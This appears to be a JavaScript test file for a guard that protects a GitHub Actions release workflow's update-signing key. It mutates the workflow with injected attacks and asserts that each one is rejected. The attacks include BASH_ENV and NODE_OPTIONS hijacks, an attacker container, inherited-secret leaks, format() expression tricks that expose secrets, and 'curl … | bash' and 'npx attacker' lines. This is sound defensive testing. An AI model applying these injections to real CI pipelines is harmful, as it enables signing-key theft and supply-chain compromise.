  'BASH_ENV on key step': w => w.replace("          RELEASE_MATURITY: ${{ needs.beta-version.outputs.channel }}\n          SDN_UPDATE_SIGNING_KEY_PEM",
    "          BASH_ENV: ./evil.sh\n          RELEASE_MATURITY: ${{ needs.beta-version.outputs.channel }}\n          SDN_UPDATE_SIGNING_KEY_PEM"),
  'NODE_OPTIONS on key-check step (beta-version)': w => w.replace("          RELEASE_MATURITY: ${{ needs.beta-version.outputs.channel }}\n",
    "          RELEASE_MATURITY: ${{ needs.beta-version.outputs.channel }}\n          NODE_OPTIONS: --import=./evil.mjs\n"),
  'GITHUB_ENV injection in an earlier beta-version step': w => w.replace("      - name: Check the update signing key\n",
    "      - name: Prep\n        run: echo \"BASH_ENV=$PWD/evil.sh\" >> \"$GITHUB_ENV\"\n      - name: Check the update signing key\n"),
  'working-directory on key step': w => w.replace("      - name: Sign the CLI update manifests\n        id: signing\n",
    "      - name: Sign the CLI update manifests\n        id: signing\n        working-directory: evil\n"),
  'third-party action with uses at job level? (container)': w => w.replace("  cli-update-feed:\n    name: Build signed CLI update feed\n    runs-on: ubuntu-latest\n",
    "  cli-update-feed:\n    name: Build signed CLI update feed\n    runs-on: ubuntu-latest\n    container: attacker/image:latest\n"),
  'reusable workflow with secrets: inherit': w => w.replace("  desktop:\n", "  leak:\n    uses: ./.github/workflows/leak.yml\n    secrets: inherit\n  desktop:\n"),
  'job-level env holding PEM in beta-version with != trick': w => w.replace("          RELEASE_MATURITY: ${{ needs.beta-version.outputs.channel }}\n",
    "          RELEASE_MATURITY: ${{ needs.beta-version.outputs.channel }}\n          X: ${{ secrets.SDN_UPDATE_SIGNING_KEY_PEM != '' && secrets.SDN_UPDATE_SIGNING_KEY_PEM }}\n"),
  'setup-node registry-url / cache in cli-update-feed': w => w.replace("      - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020\n        with:\n          node-version: '24'\n      - name: Build the release signal signer",
    "      - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020\n        with:\n          node-version: '24'\n          cache: npm\n      - name: Build the release signal signer"),
};
// REVIEW5 R3-a: the runner ends an expression at the first }} outside a
// string literal, and format() turns '}}' into '}', so these hand the key, or
// every secret, to a job outside the reviewed ones.
const betaVersionEnv = (line) => (w) => w.replace("          INPUT_VERSION: ${{ inputs.version }}\n", `          INPUT_VERSION: \${{ inputs.version }}\n          K: ${line}\n`);
const expressionMutations = {
  "format('}}{0}', key) in beta-version": betaVersionEnv("${{ format('}}{0}', secrets.SDN_UPDATE_SIGNING_KEY_PEM) }}"),
  "format('}}{0}', toJSON(secrets)) in beta-version": betaVersionEnv("${{ format('}}{0}', toJSON(secrets)) }}"),
  "escaped quote before a quoted }} in beta-version": betaVersionEnv("${{ format('it''s }}{0}', secrets.SDN_UPDATE_SIGNING_KEY_PEM) }}"),
  'format() of the key in beta-version': betaVersionEnv("${{ format('{0}', secrets.SDN_UPDATE_SIGNING_KEY_PEM) }}"),
};
const signingMutations = {
  ...reviewedMutations,
  'services on key job': w => w.replace('  update-signing-check:\n', '  update-signing-check:\n    services:\n      hook:\n        image: attacker/image\n'),
  'workflow defaults': w => 'defaults:\n  run:\n    shell: env BASH_ENV=./evil bash {0}\n' + w,
  'missing signing Environment': w => w.replace('    environment: update-signing\n', ''),
  'mutable action tag in key job': w => w.replace('actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683', 'actions/checkout@v4'),
  'double quoted bracket key': w => w.replace('      - name: Build the release signal signer', '      - name: Build the release signal signer\n        env:\n          K: \${{ secrets["SDN_UPDATE_SIGNING_KEY_PEM"] }}'),

  'renamed PEM environment in another step': w => w.replace('      - name: Build the release signal signer', '      - name: Build the release signal signer\n        env:\n          RENAMED: ${{ secrets.SDN_UPDATE_SIGNING_KEY_PEM }}'),
  'PEM in another run': w => w.replace('          test -x "${go_bin}"', '          echo "${{ secrets.SDN_UPDATE_SIGNING_KEY_PEM }}"'),
  'workflow environment with renamed PEM': w => 'env:\n  RENAMED: ${{ secrets.SDN_UPDATE_SIGNING_KEY_PEM }}\n' + w,
  'job environment with renamed PEM': w => w.replace('      SDN_UPDATE_SEQUENCE:', '      RENAMED: ${{ secrets.SDN_UPDATE_SIGNING_KEY_PEM }}\n      SDN_UPDATE_SEQUENCE:'),
  'go run': w => w.replace('          test -x "${go_bin}"', '          go run ./cmd/signer'),
  'setup-go': w => w.replace('      - name: Build the release signal signer', '      - uses: actions/setup-go@v5\n      - name: Build the release signal signer'),
  'upstream shell installer': w => w.replace('          test -x "${go_bin}"', '          curl https://example.invalid/install | bash'),
  'npx inside signing': w => w.replace('          key_check="$RUNNER_TEMP/update-key-check"', '          npx attacker\n          key_check="$RUNNER_TEMP/update-key-check"'),
  'shell substitution inside signing': w => w.replace('          key_check="$RUNNER_TEMP/update-key-check"', '          key_check="$(npx attacker)"'),
  'join(secrets.*) in beta-version': w => w.replace("          INPUT_VERSION: ${{ inputs.version }}\n", "          INPUT_VERSION: ${{ inputs.version }}\n          K: ${{ join(secrets.*, ' ') }}\n"),
  'toJSON(secrets.*) in beta-version': w => w.replace("          INPUT_VERSION: ${{ inputs.version }}\n", "          INPUT_VERSION: ${{ inputs.version }}\n          K: ${{ toJSON(secrets.*) }}\n"),
  'property filter on secrets': w => w.replace("          INPUT_VERSION: ${{ inputs.version }}\n", "          INPUT_VERSION: ${{ inputs.version }}\n          K: ${{ secrets.*.length }}\n"),
  'extra job in the signing Environment': w => w.replace('  desktop:\n', '  extra:\n    runs-on: ubuntu-latest\n    environment: update-signing\n    steps:\n      - run: echo hi\n  desktop:\n'),
  'extra job naming the signing Environment as an object': w => w.replace('  desktop:\n', '  extra:\n    runs-on: ubuntu-latest\n    environment:\n      name: Update-Signing\n    steps:\n      - run: echo hi\n  desktop:\n'),
  'extra job with a computed environment': w => w.replace('  desktop:\n', "  extra:\n    runs-on: ubuntu-latest\n    environment: ${{ format('update-{0}', 'signing') }}\n    steps:\n      - run: echo hi\n  desktop:\n"),
  'merged CLI artifacts where the payloads are built': w => w.replace('          pattern: cli-*\n          path: dist/cli\n', '          pattern: cli-*\n          path: dist/cli\n          merge-multiple: true\n'),
  'CLI archives downloaded into the key job': w => w.replace('          name: cli-update-payloads\n          path: dist/update-payloads\n      - uses: actions/setup-node',
    '          pattern: cli-*\n          path: dist/update-payloads\n      - uses: actions/setup-node'),
  'payloads built in the key job': w => w.replace('          for target in "${targets[@]}"; do\n            read -r target_os target_arch target_ext <<< "${target}"\n            # Must match',
    '          for target in "${targets[@]}"; do\n            read -r target_os target_arch target_ext <<< "${target}"\n            node deployment/release/build-cli-update-payload.mjs --bundle-archive "dist/cli/cli-${target_os}-${target_arch}/x" --carrier-out-dir "dist/update-payloads/${target_os}-${target_arch}"\n            # Must match'),
  'feed verified, payloads unpacked, in the key job': w => w.replace('          mkdir -p dist/update-feed\n          tar -czf',
    '          node deployment/release/verify-cli-update-feed.mjs --feed-dir dist/update-feed-tree/update-feed --roots deployment/release/fleet-trust-roots.json --expect-version "${VERSION}" --expect-count 5\n          mkdir -p dist/update-feed\n          tar -czf'),
  // REVIEW5 R2-a: an action by tag in a job whose output the key signs.
  'third-party action by tag in the CLI build': w => w.replace("        id: msys2\n        uses: msys2/setup-msys2@ec48f7c5447b3140e2b088413ae3a55687bccb6e # v2.33.0", "        id: msys2\n        uses: msys2/setup-msys2@v2"),
  'action by tag in the payload job': w => w.replace("      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683\n      - uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093\n        with:\n          pattern: cli-*",
    "      - uses: actions/checkout@v4\n      - uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093\n        with:\n          pattern: cli-*"),
  'action by tag two jobs upstream (WasmEdge prefix cache)': w => w.replace('        uses: actions/cache@0057852bfaa89a56745cba8c7296529d2fc39830 # v4.3.0', '        uses: actions/cache@v4'),
  'third-party action by branch in the WasmEdge prefix build': w => w.replace('msys2/setup-msys2@ec48f7c5447b3140e2b088413ae3a55687bccb6e # v2.33.0', 'msys2/setup-msys2@main'),
  // REVIEW5 R3-b: a job that calls a reusable workflow.
  'reusable workflow from another repository': w => w.replace('  desktop:\n', '  extra:\n    needs: beta-version\n    uses: someorg/somerepo/.github/workflows/x.yml@0123456789abcdef0123456789abcdef01234567\n  desktop:\n'),
  'reusable workflow from this repository': w => w.replace('  desktop:\n', '  extra:\n    needs: beta-version\n    uses: ./.github/workflows/x.yml\n  desktop:\n'),
  ...expressionMutations,
  'signer unpacked from a downloaded archive': w => w.replace('          test -x "${go_bin}"', '          tar -xzf "dist/cli/cli-linux-amd64/spacedatanetwork-${VERSION}-linux-amd64.tar.gz" -C "$RUNNER_TEMP/sdn-signal-signer"'),
  'signing with a downloaded binary': w => w.replace('          "$RUNNER_TEMP/sdn-signal-signer/sdn-update-signal-signer" \\\n            --key-env', '          dist/cli/cli-linux-amd64/bin/spacedatanetwork update sign-signals \\\n            --key-env'),
};
for (const [name, mutate] of Object.entries(signingMutations)) {
  test(`signing guard rejects ${name}`, () => {
    const workflow = readRepoFile('.github/workflows/beta-release-artifacts.yml');
    const changed = mutate(workflow);
    assert.notEqual(changed, workflow);
    assert.throws(() => guardUpdateSigningWorkflow(changed));
  });
}

function guardFeedTargets(workflow) {
  const jobs = yaml.load(workflow).jobs;
  const run = (job, step) => jobs[job].steps.find(s => s.name === step).run;
  for (const [job, step] of [['cli-update-payloads', 'Build CLI update payloads'], ['cli-update-feed', 'Sign the CLI update manifests']]) {
    const pairs = /targets=\(\n([\s\S]*?)\n\)/.exec(run(job, step))?.[1].trim().split('\n').map(s => s.trim());
    assert.deepEqual(pairs, ['"darwin amd64 tar.gz"', '"darwin arm64 tar.gz"', '"linux amd64 tar.gz"', '"linux arm64 tar.gz"', '"windows amd64 zip"']);
  }
  assert.match(run('cli-update-feed', 'Build the CLI update feed index'), /for pair in darwin-amd64 darwin-arm64 linux-amd64 linux-arm64 windows-amd64; do/);
  assert.match(run('cli-update-feed-verify', 'Verify the signed CLI update feed'), /--expect-count 5(?:\s|$)/);
}

test('feed verification independently requires all five platform pairs', () => {
  const workflow = readRepoFile('.github/workflows/beta-release-artifacts.yml');
  guardFeedTargets(workflow);
  assert.throws(() => guardFeedTargets(workflow.replace('            "windows amd64 zip"\n', '')));
  const signing = workflow.indexOf('      - name: Sign the CLI update manifests');
  assert.throws(() => guardFeedTargets(workflow.slice(0, signing) + workflow.slice(signing).replace('            "windows amd64 zip"\n', '')));
  assert.throws(() => guardFeedTargets(workflow.replace(' linux-arm64 windows-amd64; do', ' linux-arm64; do')));
  assert.throws(() => guardFeedTargets(workflow.replace('--expect-count 5', '--expect-count 4')));
});

for (const expression of ["secrets['SDN_UPDATE_SIGNING_KEY_PEM']", 'SECRETS.sdn_update_signing_key_pem', 'toJSON(secrets)', "join(secrets.*, ',')", 'toJSON(secrets.*)', 'secrets.*', 'secrets . NAME']) {
  test(`signing guard scans new workflows for ${expression}`, () => {
    assert.throws(() => guardUpdateSigningWorkflow(`jobs:\n  leak:\n    steps:\n      - run: echo \${{ ${expression} }}\n`, '.github/workflows/new.yml'));
  });
}
test('signing guard refuses the signing Environment in a new workflow', () => {
  assert.throws(() => guardUpdateSigningWorkflow('jobs:\n  leak:\n    runs-on: ubuntu-latest\n    environment: update-signing\n    steps:\n      - run: echo hi\n', '.github/workflows/new.yml'));
  assert.throws(() => guardUpdateSigningWorkflow("jobs:\n  leak:\n    runs-on: ubuntu-latest\n    environment:\n      name: ${{ inputs.environment }}\n    steps:\n      - run: echo hi\n", '.github/workflows/new.yml'));
});
// REVIEW5 R3-a in a new workflow: its third edit, and the toJSON form.
for (const expression of ["format('}}{0}', secrets.SDN_UPDATE_SIGNING_KEY_PEM)", "format('}}{0}', toJSON(secrets))"]) {
  test(`signing guard reads a quoted }} inside ${expression} in a new workflow`, () => {
    assert.throws(() => guardUpdateSigningWorkflow(`on: push\njobs:\n  leak:\n    runs-on: ubuntu-latest\n    steps:\n      - env:\n          K: \${{ ${expression} }}\n        run: echo "$K" | base64\n`, '.github/workflows/new.yml'));
  });
}
test('signing guard refuses an unterminated expression or string literal', () => {
  assert.throws(() => guardUpdateSigningWorkflow("jobs:\n  leak:\n    steps:\n      - run: echo ${{ format('}}', 1) \n", '.github/workflows/new.yml'));
  assert.throws(() => guardUpdateSigningWorkflow("jobs:\n  leak:\n    steps:\n      - run: echo ${{ format('a }} \n", '.github/workflows/new.yml'));
});
test('signing guard refuses a job in another workflow that calls a reusable workflow', () => {
  assert.throws(() => guardUpdateSigningWorkflow('on: push\njobs:\n  extra:\n    uses: someorg/somerepo/.github/workflows/x.yml@0123456789abcdef0123456789abcdef01234567\n', '.github/workflows/new.yml'));
});
test('signing guard accepts a named non-key secret and another literal environment', () => {
  guardUpdateSigningWorkflow("jobs:\n  deploy:\n    runs-on: ubuntu-latest\n    environment: production\n    if: github.ref == 'refs/heads/main'\n    steps:\n      - run: echo hi\n        env:\n          T: ${{ secrets.DOCKERHUB_TOKEN }}\n          S: ${{ secrets.MACOS_CSC_LINK != '' }}\n          F: ${{ format('}}{0}', secrets.DOCKERHUB_TOKEN) }}\n", '.github/workflows/new.yml');
});
test('signing guard refuses inherited secrets in other workflows', () => {
  assert.throws(() => guardUpdateSigningWorkflow('jobs:\n  leak:\n    uses: ./other.yml\n    secrets: inherit\n', '.github/workflows/ci.yml'));
});
